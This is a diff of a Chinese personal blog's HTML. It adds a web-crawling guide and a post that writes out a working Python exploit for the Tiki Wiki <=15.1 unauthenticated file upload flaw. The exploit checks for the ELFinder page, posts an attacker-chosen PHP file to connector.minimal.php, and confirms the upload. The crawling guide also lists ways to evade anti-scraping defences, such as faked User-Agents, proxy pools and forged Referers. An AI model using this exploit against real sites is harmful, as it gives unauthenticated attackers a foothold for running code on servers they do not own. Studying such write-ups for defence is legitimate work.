+<li>Xpath+lxml:最推荐，可以直接用一个表达式找到要找的内容，而bs就没这么方便，它要一层一层的去循环。<br><a href="http://www.w3school.com.cn/xhtml/index.asp" target="_blank" rel="noopener">学习xml</a></li>
+<li>re</li>
+</ul>
+<h3 id="关于并发编程"><a href="#关于并发编程" class="headerlink" title="关于并发编程"></a>关于并发编程</h3><ul>
+<li>不推荐twisted;asyncio是未来的趋势，推荐。<a href="https://github.com/dongweiming/weapp-zhihulive" target="_blank" rel="noopener">知乎Live微信小程序 &amp; asyncio爬虫</a></li>
+</ul>
+<h3 id="关于任务调度框架"><a href="#关于任务调度框架" class="headerlink" title="关于任务调度框架"></a>关于任务调度框架</h3><ul>
+<li>celery：分布式任务队列</li>
+<li>huey:推荐小规模的爬虫需求使用，也推荐读一下它的源码。<a href="https://github.com/coleifer/huey" target="_blank" rel="noopener">https://github.com/coleifer/huey</a></li>
+</ul>
+<h2 id="抓取的流程图"><a href="#抓取的流程图" class="headerlink" title="抓取的流程图"></a>抓取的流程图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/181125978.png" alt="mark"></p>
+<p><strong>发送网络请求-&gt;下载好数据后解析html-&gt;解析成想要的格式之后存储</strong></p>
+<h2 id="celery的流程图"><a href="#celery的流程图" class="headerlink" title="celery的流程图"></a>celery的流程图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/181411194.png" alt="mark"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/194754070.png" alt="mark"></h2><p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live1.mp4</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/195002034.png" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/195015479.png" alt="mark"></p>
+<p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live2.mp4</p>
+<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p>AJAX出现的较早，在分离这上面做的不是很好，大厂都已经迁移到了Fetch上。<br><a href="https://github.com/camsong/blog/issues/2" target="_blank" rel="noopener">https://github.com/camsong/blog/issues/2</a></p>
+<h2 id="动态网页抓取"><a href="#动态网页抓取" class="headerlink" title="动态网页抓取"></a>动态网页抓取</h2><p>关于动态网页的抓取是一件比较困难的事情。有些动态页面可以从接口直接获取数据，但是有一些不行，比如：</p>
+<ul>
+<li>用到了现在比较潮流的框架，比如react；</li>
+<li>有些需要页面交互才能获取到数据，比如点个按钮</li>
+<li>有些是在javascript执行之后生成的。<br>这种时候就必须要了解这个过程中是怎么实现渲染的，我们要考虑一个动态页面的抓取的过程。</li>
+</ul>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>业界动态网页的抓取，常使用selenium + phantomjs，其实就像是打开浏览器，设定一些操作和事件，来模仿一个真实的用户，再通过它提供的接口找到要爬取的元素，拿到它的值。</strong><br>selenium本来是用来做自动化测试的，还能做鼠标拖动、截屏之类的操作。<br>phantomjs是一个没有web界面的，可脚本编程的webkit浏览器引擎，可以进行CSS、DOM操作等等。</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/204226753.png" alt="mark"></p>
+<p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live3.mp4</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483737&amp;idx=1&amp;sn=3f44134e630408c9b950f7d513722059&amp;chksm=9f76adefa80124f94d0d0faa8751530636cb9863e9af9d6c56475719b57c105aa611423d5656#rd" target="_blank" rel="noopener">几篇celery的文章（一）</a><br><a href="http://www.bjhee.com/celery.html" target="_blank" rel="noopener">几篇celery的文章（二）</a><br><a href="http://funhacks.net/2016/12/13/celery/" target="_blank" rel="noopener">几篇celery的文章（三）</a></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/210110160.png" alt="mark"></p>
+<p>很多人会纠结于是用多线程多进程还是asyncio呢，要不要学习twisted呢？其实不需要纠结，先实现功能。</p>
+<p>其实主要的性能瓶颈在于要爬取的网站的网络延时、页面渲染的速度还有反爬虫策略。</p>
+<p>当然爬虫本身性能可优化的地方也很多，这里有一些建议</p>
+<ol>
+<li>并发或者分布式的方式去爬取。</li>
+<li>使用队列减少数据库的访问。</li>
+<li>按需对数据写操作，从单个执行变成批量执行。（通常是先存在某个地方，比如reddis,然后调一个批量任务定期抓取）</li>
+<li>选择合适的数据库建立正确的索引。如果早期对需求不清楚不确定，用Nosql（比如Mongodb）方便很多，即使数据脏了也可以通过程序处理。</li>
+<li>并发效率并不是线性的，并发数高了对网站和数据库还是有负担。<br>……</li>
+</ol>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/211427350.png" alt="mark"></p>
+<h2 id="对付常用的反爬虫策略"><a href="#对付常用的反爬虫策略" class="headerlink" title="对付常用的反爬虫策略"></a>对付常用的反爬虫策略</h2><h3 id="设置IP的访问频率"><a href="#设置IP的访问频率" class="headerlink" title="设置IP的访问频率"></a>设置IP的访问频率</h3><p>如果超出一定的频率就会出现验证码。处理验证码可以专门写程序处理，也可以使用开源项目。</p>
+<p><em>推荐的生成验证码图片的项目 <a href="https://github.com/lepture/captcha" target="_blank" rel="noopener">https://github.com/lepture/captcha</a> </em></p>
+<h3 id="伪造User-Agent"><a href="#伪造User-Agent" class="headerlink" title="伪造User Agent"></a>伪造User Agent</h3><p>一直用一个UA会被开发工程师发现。</p>
+<h3 id="建立IP代理池"><a href="#建立IP代理池" class="headerlink" title="建立IP代理池"></a>建立IP代理池</h3><p><em>获取大量免费代理ip的项目<a href="https://github.com/awolfly9/IPProxyTool" target="_blank" rel="noopener">https://github.com/awolfly9/IPProxyTool</a>  </em></p>
+<h3 id="改变refer值"><a href="#改变refer值" class="headerlink" title="改变refer值"></a>改变refer值</h3><p>不直接访问，伪造refer</p>
+<h3 id="模仿搜索引擎"><a href="#模仿搜索引擎" class="headerlink" title="模仿搜索引擎"></a>模仿搜索引擎</h3><p>有可能被打上好人卡~</p>
+<h3 id="保存cookie，使用cookie免登陆"><a href="#保存cookie，使用cookie免登陆" class="headerlink" title="保存cookie，使用cookie免登陆"></a>保存cookie，使用cookie免登陆</h3><h2 id="关于反反爬虫的项目"><a href="#关于反反爬虫的项目" class="headerlink" title="关于反反爬虫的项目"></a>关于反反爬虫的项目</h2><p><strong>推荐的项目：<a href="https://github.com/luyishisi/Anti-Anti-Spider" target="_blank" rel="noopener">https://github.com/luyishisi/Anti-Anti-Spider</a></strong></p>
+<h2 id="学习典例"><a href="#学习典例" class="headerlink" title="学习典例"></a>学习典例</h2><p>爬虫入门：<br><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21479334</a></p>
+<p>知道创宇面试题：<br><a href="http://www.dongwm.com/archives/pa-chong-lian-xi/" target="_blank" rel="noopener">http://www.dongwm.com/archives/pa-chong-lian-xi/</a></p>
+<p>搜狐面试：<br><a href="https://github.com/dongweiming/mtime" target="_blank" rel="noopener">https://github.com/dongweiming/mtime</a></p>
+<p><strong>awesome（个人推荐）：</strong></p>
+<p><a href="https://github.com/BruceDone/awesome-crawler" target="_blank" rel="noopener">https://github.com/BruceDone/awesome-crawler</a></p>
+<p><a href="https://github.com/liinnux/awesome-crawler-cn" target="_blank" rel="noopener">https://github.com/liinnux/awesome-crawler-cn</a></p>
+<p><a href="https://github.com/facert/awesome-spider" target="_blank" rel="noopener">https://github.com/facert/awesome-spider</a></p>
+<p><a href="https://github.com/aosabook/500lines/tree/master/crawler/code" target="_blank" rel="noopener">https://github.com/aosabook/500lines/tree/master/crawler/code</a></p>
+<p>scrapy +redis+mongodb进行分布式爬虫 </p>
+<p><a href="https://github.com/gnemoug/distribute_crawler" target="_blank" rel="noopener">https://github.com/gnemoug/distribute_crawler</a></p>
+<p>技术选型： </p>
+<ul>
+<li>mongodb:存储爬取的结果（因为它不要求字段的数据结构严格一致化，对脏数据的容错性好）</li>
+<li>redis:分布式/消息队列/一级缓存（存储中间数据）</li>
+<li>scrapy:爬虫里最好的一个框架，基于twisted，高度封装。</li>
+</ul>
+<p>scrapy+django拓展</p>
+<p><a href="https://github.com/scrapy-plugins/scrapy-djangoitem" target="_blank" rel="noopener">https://github.com/scrapy-plugins/scrapy-djangoitem</a></p>
+<h2 id="爬虫情景"><a href="#爬虫情景" class="headerlink" title="爬虫情景"></a>爬虫情景</h2><h3 id="对腾讯视频、优酷视频的评论、播放量等的采集"><a href="#对腾讯视频、优酷视频的评论、播放量等的采集" class="headerlink" title="对腾讯视频、优酷视频的评论、播放量等的采集"></a>对腾讯视频、优酷视频的评论、播放量等的采集</h3><p>打开网页，弹一个h5或flash的播放器，会请求后端发送视频资源。 </p>
+<ul>
+<li>页面打开后渲染的第一页就是评论，然后其他页在你翻页或者滚动的时候通过ajax再去加载出来。</li>
+<li>刚开始打开页面的时候，底下就没有评论。在后期通过ajax请求过来。相当于视频加载和评论加载（或者其他）分开进行。</li>
+</ul>
+<p><strong> 一般是不可能打开页面后全部评论加载出来的 </strong></p>
+
           
-书籍推荐：《python核心编程》/《python语言及其应用》-&gt;《python cookbook》 
-《用Python写网络爬虫》
-python/爬虫实践文章https://juejin.im/post/58dce2248d6d8100613a4cfb
-https://zhuanlan.zhihu.com/p/21479334
-https://zhuanlan.zhihu.com/p/25633789
-https://xlzd.me/tag/crawler/
-http://dongweiming.github.io/Expert-Python/#1
-学习建议熟悉了python语法之
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/18/crawler/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
@@ -1185,7 +1309,7 @@ http://dongweiming.github.io/Expert-Python/#1
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1247,17 +1371,6 @@ http://dongweiming.github.io/Expert-Python/#1
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -1284,16 +1397,21 @@ http://dongweiming.github.io/Expert-Python/#1
       
         
           
-          Tiki Wiki &lt;=15.1 - Unauthenticated File Upload漏洞原理利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，漏洞来自tiki的第三方组件ELFinder -version 2.0该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等并且该页面不强制进行文件扩展名、内容类型等验证。因此，未经身份验证的用户也可以上传PHP文件。
-exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-requests.org/zh_CN/latest/user/quickstart.html123
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h1 id="Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload"><a href="#Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload" class="headerlink" title="Tiki Wiki &lt;=15.1 - Unauthenticated File Upload"></a>Tiki Wiki &lt;=15.1 - Unauthenticated File Upload</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，<br>漏洞来自tiki的第三方组件ELFinder -version 2.0<br>该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等<br>并且该页面不强制进行文件扩展名、内容类型等验证。<br>因此，未经身份验证的用户也可以上传PHP文件。</strong></p>
+<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><h3 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1. 检测漏洞是否存在"></a>1. 检测漏洞是否存在</h3><p>使用requests模块，<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url, port)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/elfinder.html'</span>]</span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    print(target_url)</span><br><span class="line">    r = requests.get(target_url)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        print(<span class="string">"检测成功,开始攻击"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"未检测到"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
+<li>选择一个php文件上传然后抓包可得：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170423/104629854.png" alt="mark"></li>
+<li>据此，使用requests库提交Multipart/form-data格式的数据，查看post部分<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170423/104720598.png" alt="mark"></li>
+<li><p>据此构造参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</span><br><span class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</span><br><span class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>随后使用post方法提交</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, port, filename)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/php/connector.minimal.php'</span>]</span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</span><br><span class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</span><br><span class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</span><br><span class="line">             &#125;</span><br><span class="line">    r = requests.post(target_url, files=files)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="3-检测是否上传成功"><a href="#3-检测是否上传成功" class="headerlink" title="3.检测是否上传成功"></a>3.检测是否上传成功</h3><p>如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_success</span><span class="params">(url, port, filename)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/files/'</span>, filename]</span><br><span class="line"></span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    r = requests.get(target_url)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        print(<span class="string">"上传成功~"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"上传失败"</span>)</span><br></pre></td></tr></table></figure></p>
+
+          
         
       
     </div>
@@ -1366,10 +1484,6 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.png"
-                alt="sakura" />
-            
               <p class="site-author-name" itemprop="name">sakura</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
@@ -1421,69 +1535,11 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
           
 
           
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
-                      
-                        <i class="fa fa-fw fa-globe"></i>知乎</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
-                      
-                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                  </span>
-                
-            </div>
-          
 
           
           
 
           
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://p1umer.club/" title="P1umer" target="_blank">P1umer</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://lirsakura.me/" title="绘梨衣" target="_blank">绘梨衣</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://dwfault-blog.imwork.net:30916/" title="dwfalut" target="_blank">dwfalut</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://www.auxy.xyz" title="Auxy" target="_blank">Auxy</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://redogwu.github.io" title="wjllz" target="_blank">wjllz</a>
-                  </li>
-                
-              </ul>
-            </div>
           
 
           
@@ -1523,32 +1579,12 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
 
 
 
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
 
         
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      
-    </span>
-  
-
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      
-    </span>
-  
-</div>
-
 
 
 
@@ -1643,13 +1679,6 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
   
   
 
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
   
 
   
@@ -1661,14 +1690,6 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
 
   
 
-
-  
-
-    
-      <script id="dsq-count-scr" src="https://sakura1328.disqus.com/count.js" async></script>
-    
-
-    
 
   
 
@@ -1687,6 +1708,10 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
 
 
 
+  
+
+
+
 
 
 
@@ -1697,323 +1722,6 @@ exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-re
 
 
   
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
